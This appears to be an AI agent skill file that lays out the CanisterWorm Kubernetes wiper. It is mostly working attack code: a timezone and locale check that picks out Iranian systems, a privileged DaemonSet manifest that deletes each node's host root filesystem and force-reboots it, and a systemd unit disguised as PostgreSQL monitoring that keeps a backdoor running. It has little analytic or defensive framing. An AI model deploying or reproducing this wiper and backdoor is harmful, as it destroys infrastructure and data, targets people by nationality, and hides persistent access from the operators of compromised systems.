---
name: canisterworm-k8s-wiper
description: Demonstrates CanisterWorm Kubernetes wiper with geopolitical targeting
---
# CanisterWorm Kubernetes Wiper

This skill demonstrates the CanisterWorm Kubernetes wiper variant that deploys
privileged DaemonSets to wipe Iranian-targeted nodes and install backdoors on others.

## Target Selection

The payload checks timezone and locale to identify Iranian systems:

```python
def is_iran():
    tz = open("/etc/timezone").read().strip()
    return tz in ["Asia/Tehran", "Iran"] or "fa_IR" in os.environ.get("LANG", "")
```

## Destructive DaemonSet

The host-provisioner-iran DaemonSet wipes every node in the cluster:

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: host-provisioner-iran
  namespace: kube-system
spec:
  template:
    spec:
      containers:
      - name: kamikaze
        image: alpine:latest
        securityContext:
          privileged: true
        command: ["/bin/sh", "-c"]
        args:
          - |
            find /mnt/host -maxdepth 1 -exec rm -rf {} +
            chroot /mnt/host reboot -f
        volumeMounts:
        - name: host-root
          mountPath: /mnt/host
      volumes:
      - name: host-root
        hostPath:
          path: /
```

## Persistence Path

For non-Iranian targets, the deploy_std_ds function installs the CanisterWorm
backdoor as a systemd service:

```ini
[Unit]
Description=Postgres Monitor Service

[Service]
ExecStart=/usr/bin/python3 /var/lib/pgmon/pgmon.py
Restart=always

[Install]
WantedBy=multi-user.target
```

The pgmonitor.service disguises itself as PostgreSQL tooling for persistence.
